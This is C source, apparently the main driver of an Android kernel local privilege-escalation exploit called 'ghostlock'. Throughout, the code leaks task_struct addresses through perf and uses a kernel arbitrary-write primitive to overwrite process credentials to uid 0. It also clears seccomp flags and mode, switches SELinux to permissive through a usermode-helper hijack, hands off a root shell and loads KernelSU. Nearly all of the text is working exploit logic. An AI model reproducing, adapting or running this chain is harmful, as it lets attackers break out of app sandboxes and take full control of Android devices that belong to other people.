    memset(&report, 0, sizeof(report));
    if (read(pipes.task_r, &report, sizeof(report)) !=
        (ssize_t)sizeof(report)) {
      pr_warning("CFI_CRED_ONLY no perf report\n");
      kill(-child, SIGKILL);
      waitpid(child, NULL, 0);
      return 1;
    }
    close(pipes.task_r);
    pr_info("CFI_CRED_ONLY child=%d candidates=%d\n", child, report.ncands);

    int root_ok = 0;
    for (int i = 0; i < report.ncands && !root_ok; i++) {
      uintptr_t cand = report.cands[i];
      if (cand < 0xffffff8000000000ULL ||
          cand >= 0xffffffc000000000ULL || (cand & 3)) {
        continue;
      }
      char cred_hex[32];
      snprintf(cred_hex, sizeof(cred_hex), "0x%016zx", cand);
      setenv("CFI_PATCH_CRED", cred_hex, 1);
      pr_info("CFI_CRED_ONLY candidate=%d/%d cred=%s\n",
              i + 1, report.ncands, cred_hex);
      slab_drain();
      int routed = do_one_write(0, "CFI direct cred", 0, 0);
      pr_info("CFI_CRED_ONLY route=%d cfi=%d step=%d errno=%d\n",
              routed, atomic_load(&cfi_stage_done), cfi_last_step,
              cfi_last_errno);
      if (atomic_load(&cfi_stage_done)) {
        struct w2_stage_context cred_context = { .pipes = &pipes };
        root_ok = verify_w2_stage(&cred_context);
      }
    }

    if (root_ok) {
      pr_success("CFI_CRED_ONLY child uid=0; running root setup\n");
      write(pipes.cmd_w, "G", 1);
      struct pollfd pfd = { .fd = pipes.uid_r, .events = POLLIN };
      uint32_t root_report = 0;
      int got = poll(&pfd, 1, 60000);
      ssize_t nr = got > 0 ? read(pipes.uid_r, &root_report,
                                  sizeof(root_report)) : -1;
      pr_success("CFI_CRED_ONLY root setup report=%u read=%zd poll=%d\n",
                 root_report, nr, got);
      close(pipes.cmd_w);
      close(pipes.uid_r);
      waitpid(child, NULL, 0);
      return 0;
    }

    pr_warning("CFI_CRED_ONLY no credential candidate became root\n");
    unsetenv("CFI_PATCH_CRED");
    kill(-child, SIGKILL);
    waitpid(child, NULL, 0);
    close(pipes.cmd_w);
    close(pipes.uid_r);
    return 1;
  }

  if (getenv("CFI_ONLY")) {
    int cfi_ok = 0;
    for (int attempt = 1; attempt <= 6 && !cfi_ok; attempt++) {
      pr_info("CFI_ONLY bootstrap attempt %d/6\n", attempt);
      slab_drain();
      int routed = do_one_write(0, "CFI_ONLY bootstrap", 0, 0);
      cfi_ok = atomic_load(&cfi_stage_done) != 0;
      pr_info("CFI_ONLY attempt %d routed=%d cfi=%d step=%d errno=%d\n",
              attempt, routed, cfi_ok, cfi_last_step, cfi_last_errno);
      if (!cfi_ok && !routed) usleep(100000);
    }
    pr_success("CFI_ONLY complete cfi=%d step=%d errno=%d\n",
               cfi_ok, cfi_last_step, cfi_last_errno);
    return cfi_ok ? 0 : 1;
  }

  if (active_offsets->umh_root) {
    /* KDP_CRED devices: never rewrite creds.  Run the route once without a
     * custom write; try_cfi_stage() swaps ashmem fops and gains the
     * configfs arbitrary write, then install_android_root() ->
     * install_workqueue_umh_root() writes SELinux permissive and queues
     * the dedicated local helper as the kernel-spawned process. */
    setenv("CFI_STAGE_IN_CONSUMER", "1", 1);
    int umh_ok = 0;
    for (int attempt = 1; attempt <= 1 && !umh_ok; attempt++) {
      pr_info("UMH bootstrap attempt %d/1\n", attempt);
      slab_drain();
      umh_ok = do_one_write(0, "UMH bootstrap", 0, 0);
      if (!umh_ok) {
        pr_warning("UMH bootstrap attempt %d failed; backing off\n", attempt);
        usleep(100000);
      }
    }
    if (!umh_ok) {
      pr_warning("UMH root staging failed\n");
      return 1;
    }
    TIMER("UMH work queued");

    /* The dedicated UMH daemon is already root and accepts both the shell
     * client and the late-load request from the original shell UID over the
     * local socket. Root shell is an explicit diagnostic mode; the normal
     * path continues with the verified late-load sequence. */
    errno = 0;
    const char *helper_path = local_root_helper_path();
    int helper_access = access(helper_path, X_OK);
    int helper_access_errno = helper_access < 0 ? errno : 0;
    pr_info("local helper=%s access=%d errno=%d socket=%s\n",
            helper_path, helper_access, helper_access_errno,
            LOCAL_ROOT_SOCKET);
    if (root_shell_requested(argc, argv)) {
      pr_info("root shell mode: skipping KernelSU late-load\n");
      TIMER("root shell handoff");
      return handoff_root_shell();
    }

    int ksu_ready = run_local_late_load();
    if (ksu_ready) {
      pr_success("KernelSU ready via local UMH helper\n");
    } else {
      pr_warning("local UMH helper late-load failed; see %s\n",
                 LOCAL_ROOT_SOCKET);
    }
    TIMER("exploit complete");
    return ksu_ready ? 0 : 1;
  }

  /* W2: overwrite the child credential via the task leaked by perf. */
  slab_drain();
  TIMER("pre-W2 drain");

  struct child_pipes pipes;
  struct w2_stage_context w2_context = { .pipes = &pipes };
  pid_t child = -1;
  uintptr_t child_task = 0;
  int child_alive = 1;
  int seccomp_ok = 0;

  /* W2+W3 as a retryable chain: the W3a probe can kill the child on a missed
   * write, so respawn and redo instead of aborting. */
  for (int round = 1; round <= 3; round++) {
    if (round > 1) {
      pr_warning("W3 chain retry %d/3: respawning child\n", round);
      if (child > 0 && child_alive) {
        kill(-child, SIGKILL);
        waitpid(child, NULL, 0);
      }
      close(pipes.cmd_w); close(pipes.uid_r);
      child_alive = 1;
      seccomp_ok = 0;
    }

    child = spawn_child(&pipes);
    if (child < 0) {
      pr_warning("fork failed\n");
      return 1;
    }

    struct task_report report;
    memset(&report, 0, sizeof(report));
    read(pipes.task_r, &report, sizeof(report));
    child_task = report.ncands > 0 ? report.cands[0] : 0;
    close(pipes.task_r);
    TIMER("perf_find_task done");

    if (!child_task) {
      /* perf leaked nothing; respawn and retry once */
      pr_info("perf returned 0, retrying...\n");
      waitpid(child, NULL, 0);
      child = spawn_child(&pipes);
      if (child < 0) { pr_warning("retry fork failed\n"); return 1; }
      memset(&report, 0, sizeof(report));
      read(pipes.task_r, &report, sizeof(report));
      child_task = report.ncands > 0 ? report.cands[0] : 0;
      close(pipes.task_r);
    }

    if (!child_task) {
      pr_warning("Cannot find task_struct (perf leak failed)\n");
      close(pipes.cmd_w);
      waitpid(child, NULL, 0);
      return 1;
    }

    int cred_sample_mode =
        getenv("PERF_GETUID") != NULL || getenv("PERF_GETUID_ALL") != NULL;
    /* A task base is the only candidate whose comm field also appears in
     * the sampled register set. Prefer that device-proven pair. */
    int task_candidate = -1;
    if (!cred_sample_mode) {
      for (int i = 0; i < report.ncands; i++) {
        for (int j = 0; j < report.ncands; j++) {
          if (report.cands[j] == report.cands[i] + TASK_COMM_OFF) {
            task_candidate = i;
            break;
          }
        }
        if (task_candidate >= 0) break;
      }
    }
    if (task_candidate < 0) {
      pr_warning("perf comm-pair validation found no task base; using top hit\n");
      task_candidate = 0;
    } else {
      child_task = report.cands[task_candidate];
    }
    pr_info("child_pid=%d %s=0x%016zx candidate=%d/%d\n",
            child, cred_sample_mode ? "cred_candidate" : "child_task",
            child_task, task_candidate + 1, report.ncands);
    pselect_child_node = 1;
    if (getenv("PERF_ONLY")) {
      close(pipes.cmd_w);
      close(pipes.uid_r);
      kill(-child, SIGKILL);
      waitpid(child, NULL, 0);
      pr_success("PERF_ONLY complete; no kernel write attempted\n");
      return 0;
    }
    const char *comm_probe_env = getenv("COMM_PROBE");
    if (comm_probe_env) {
      int probe_mode = atoi(comm_probe_env);
      int probe_leaf = probe_mode == 1;
      struct w3_stage_context probe_context = {
        .pipes = &pipes,
        .leaf_to_target8 = 1,
      };
      slab_drain();
      int routed = do_one_write(
          child_task + TASK_COMM_OFF, "COMM probe", probe_mode, probe_leaf);
      int probe_ok = 0;
      if (routed && probe_mode == 1) {
        probe_ok = verify_leaf_dir_stage(&probe_context);
      } else if (routed) {
        usleep(50000);
        char path[64];
        unsigned char cb[16] = {0};
        snprintf(path, sizeof(path), "/proc/%d/comm", child);
        int cfd = open(path, O_RDONLY | O_CLOEXEC);
        if (cfd >= 0) {
          ssize_t nr = read(cfd, cb, sizeof(cb));
          close(cfd);
          pr_info("mode2 comm bytes n=%zd: %02x %02x %02x %02x "
                  "%02x %02x %02x %02x\n", nr,
                  cb[0], cb[1], cb[2], cb[3],
                  cb[4], cb[5], cb[6], cb[7]);
          uintptr_t expected = text_addr(g_init_cred_image);
          probe_ok = nr >= (ssize_t)sizeof(expected) &&
                     memcmp(cb, &expected, sizeof(expected)) == 0;
        }
      }
      close(pipes.cmd_w);
      close(pipes.uid_r);
      kill(-child, SIGKILL);
      waitpid(child, NULL, 0);
      pr_success("COMM_PROBE complete routed=%d probe=%d\n", routed, probe_ok);
      return probe_ok ? 0 : 1;
    }

    int cred_ok = 0;
    if (getenv("PERF_HOLD")) {
      pr_info("PERF_HOLD: waiting for external cred write\n");
      for (;;) {
        if (write(pipes.cmd_w, "C", 1) != 1) break;
        uint32_t held_uid = 9999;
        if (read(pipes.uid_r, &held_uid, sizeof(held_uid)) !=
            (ssize_t)sizeof(held_uid)) {
          break;
        }
        pr_info("PERF_HOLD child uid=%u cred=0x%016zx\n",
                held_uid, child_task);
        if (held_uid == 0) {
          cred_ok = 1;
          pr_success("PERF_HOLD observed uid=0\n");
          break;
        }
        sleep(1);
      }
      if (!cred_ok) {
        pr_warning("PERF_HOLD child exited before uid=0\n");
        close(pipes.cmd_w);
        close(pipes.uid_r);
        waitpid(child, NULL, 0);
        return 1;
      }
    }
    if (getenv("CRED_LEAF_SCAN")) {
      const char *only_index_env = getenv("CRED_CANDIDATE_INDEX");
      int only_index = only_index_env ? atoi(only_index_env) : -1;
      for (int i = cred_sample_mode ? 0 : 1;
           i < report.ncands && !cred_ok; i++) {
        if (only_index >= 0 && i != only_index) continue;
        uintptr_t cand = report.cands[i];
        if ((!cred_sample_mode && cand == child_task) ||
            cand < 0xffffff8000000000ULL ||
            cand >= 0xffffffc000000000ULL ||
            (!cred_sample_mode && (cand & 0xfff) == 0)) {
          continue;
        }
        pr_info("cred leaf scan candidate=%d addr=0x%016zx\n", i, cand);
        static const int side_offsets[] = { 0, -8 };
        for (size_t side = 0;
             side < sizeof(side_offsets) / sizeof(side_offsets[0]) && !cred_ok;
             side++) {
          uintptr_t target =
              cand + CRED_UID_OFF + (uintptr_t)(intptr_t)side_offsets[side];
          int attempts = (cred_sample_mode && report.ncands == 1) ? 12 : 4;
          for (int attempt = 1; attempt <= attempts && !cred_ok; attempt++) {
            pr_info("cred zero attempt %d/%d candidate=%d side=%d "
                    "target=0x%016zx\n",
                    attempt, attempts, i, side_offsets[side], target);
            slab_drain();
            int routed = do_one_write(
                target, "cred uid leaf zero", 1, 1);
            if (!routed) {
              usleep(50000);
              continue;
            }
            usleep(50000);
            cred_ok = verify_w2_stage(&w2_context);
          }
        }
        if (cred_ok) {
          pr_success("cred object uid zeroed at candidate=%d\n", i);
        }
      }
      if (!cred_ok && getenv("CRED_LEAF_SCAN_ONLY")) {
        pr_warning("cred leaf scan did not find the credential\n");
        write(pipes.cmd_w, "X", 1);
        close(pipes.cmd_w); close(pipes.uid_r);
        waitpid(child, NULL, 0);
        return 1;
      }
    }
    for (int attempt = 1; attempt <= 10 && !cred_ok; attempt++) {
      slab_drain();
      int routed = do_one_write(child_task + TASK_CRED_OFF, "W2: cred", 2, 0);
      if (!routed) {
        usleep(50000);
        continue;
      }
      usleep(50000);
      cred_ok = verify_w2_stage(&w2_context);
      if (!cred_ok) usleep(50000);
    }
    if (!cred_ok) {
      pr_warning("W2 cred failed after 10 rounds\n");
      write(pipes.cmd_w, "X", 1);
      close(pipes.cmd_w); close(pipes.uid_r);
      waitpid(child, NULL, 0);
      return 1;
    }

    if (!getenv("CRED_LEAF_SCAN") && !getenv("PERF_HOLD")) {
      int real_cred_ok = 0;
      for (int attempt = 1; attempt <= 3 && !real_cred_ok; attempt++) {
        slab_drain();
        real_cred_ok = do_one_write(
            child_task + TASK_REAL_CRED_OFF, "W2b: real_cred", 2, 0);
        if (!real_cred_ok) usleep(50000);
      }
      if (!real_cred_ok) {
        pr_warning("W2b real_cred failed after 3 rounds\n");
      } else {
        pr_success("W2b: real_cred pinned\n");
      }
    }

    /* W3: clear the child's seccomp filter for the late-load worker
     * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
     * must be zeroed too; zeroing mode with the flag still set BUG()s, hence
     * the direct probe first: cleared -> normal errno, active -> SIGSYS.
     * Leaf writes land on [target] or [target+8]; a comm probe picks the side
     * before targeting thread_info.flags (task+0) / seccomp.mode. */
    if (!process_has_seccomp()) {
      pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
      seccomp_ok = 1;
      break;
    }

    struct w3_stage_context w3_context = {
      .pipes = &pipes,
      .leaf_to_target8 = 1,
    };
    int dir_ok = retry_write_stage(
        "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
        verify_leaf_dir_stage, &w3_context, 1);
    if (!dir_ok) {
      pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
    }

    uintptr_t flags_target = w3_context.leaf_to_target8
      ? child_task - 8
      : child_task + TASK_THREAD_INFO_FLAGS_OFF;

    int w3a_ok = 0;
    for (int attempt = 1; attempt <= 6; attempt++) {
      pr_info("W3a: TIF_SECCOMP attempt %d/6\n", attempt);
      if (attempt == 1) slab_drain();
      int routed = do_one_write(flags_target, "W3a: TIF_SECCOMP", 1, 1);
      if (!routed) {
        pr_warning("W3a attempt %d route failed; backing off\n", attempt);
        usleep(100000);
        continue;
      }
      usleep(50000);
      if (verify_w3a_direct_stage(&w2_context)) {
        w3a_ok = 1;
        break;
      }
      int st = 0;
      if (waitpid(child, &st, WNOHANG) == child) {
        pr_warning("W3a lost the child (status=0x%x); chain will retry\n", st);
        child_alive = 0;
        break;
      }
      usleep(50000);
    }

    if (!w3a_ok) {
      pr_warning("W3 TIF_SECCOMP clear failed; ksud late-load will likely stay blocked\n");
      continue; /* respawn and redo the chain */
    }

    pr_success("W3a: child TIF_SECCOMP cleared\n");
    /* Forked probe mirrors the late-load worker; zero mode (W3b) and
     * re-probe if it still hits the filter. */
    seccomp_ok = verify_seccomp_probe_stage(&w2_context);
    if (!seccomp_ok) {
      uintptr_t mode_target = w3_context.leaf_to_target8
        ? child_task + TASK_SECCOMP_OFF - 8
        : child_task + TASK_SECCOMP_OFF;
      /* Vendor TASK_SECCOMP_OFF may point at the filter slot; the fork probe
       * verifies the result either way. */
      seccomp_ok = retry_write_stage(
          "W3b: seccomp mode", mode_target, 1, 4, 50000,
          verify_seccomp_probe_stage, &w2_context, 1);
      if (!seccomp_ok) {
        pr_warning("W3b seccomp clear or final probe failed; chain will retry\n");
        continue;
      }
    }
    pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
    break;
  }

  if (!seccomp_ok)
    pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load will likely stay blocked\n");

  sleep(2);
  TIMER("exploit complete");
  if (child_alive) {
    if (write(pipes.cmd_w, "G", 1) != 1)
      pr_warning("failed to start late-load worker (child exited early)\n");
  } else {
    pr_warning("skipping late-load: child died during W3\n");
  }
  close(pipes.cmd_w);
  uint32_t child_report = 0;
  if (child_alive) {
    /* Bound the late-load handoff: if the worker hangs (e.g. a kernel lock
     * inside a script step), kill the whole tree so the app flow finishes. */
    int waited_ms = 0;
    for (;;) {
      pid_t r = waitpid(child, NULL, WNOHANG);
      if (r == child || r < 0) break;
      if (waited_ms >= 45000) {
        pr_warning("late-load worker timed out; killing child\n");
        kill(-child, SIGKILL);
        waitpid(child, NULL, 0);
        break;
      }
      usleep(100000);
      waited_ms += 100;
    }
    struct pollfd pfd = { .fd = pipes.uid_r, .events = POLLIN };
    ssize_t nr = -1;
    if (poll(&pfd, 1, 10000) > 0 && (pfd.revents & POLLIN)) {
      nr = read(pipes.uid_r, &child_report, sizeof(child_report));
    }
    if (nr != (ssize_t)sizeof(child_report)) child_report = 0;
  }
  close(pipes.uid_r);

  int kernelsu_ready = 0;
  for (int i = 0; i < 30 && !(kernelsu_ready = kernelsu_module_loaded()); i++) {
    usleep(100000);
  }
  /* The poll can miss a module once enforcing is restored (untrusted_app
   * loses /proc/modules); use the child's report, falling back to the log. */
  int ksu_log_loaded = (child_report & 1u) != 0;
  for (int i = 0; i < 30 && !ksu_log_loaded; i++) {
    char ksu_log_path[320];
    snprintf(ksu_log_path, sizeof(ksu_log_path), "%s/.ghostlock_ksu.log", g_home_dir);
    FILE *lf = fopen(ksu_log_path, "r");
    if (lf) {
      char line[256];
      while (fgets(line, sizeof(line), lf)) {
        if (strstr(line, "[+] KernelSU module loaded")) ksu_log_loaded = 1;
      }
      fclose(lf);
    }
    if (!ksu_log_loaded) usleep(200000);
  }
  kernelsu_ready = kernelsu_ready || ksu_log_loaded;

  /* ksud restores enforcing itself once the module is up, so a loaded module
   * is the success signal. */
  if (kernelsu_ready)
    pr_success("KernelSU ready; SELinux enforcing restored\n");
  else if (seccomp_ok)
    pr_warning("temporary root ready; KernelSU module not loaded (ksud late-load failed; see .ghostlock_ksu.log)\n");
  else
    pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
  return 0;
}

int main(int argc, char **argv) {
  if (argc >= 2 && strcmp(argv[1], "--umh") == 0) {
    return ghostlock_umh_entry(argc, argv);
  }
  if (argc == 2 && strcmp(argv[1], "--late-load") == 0) {
    return ghostlock_late_load_client();
  }
  return run_exploit(argc, argv);
}
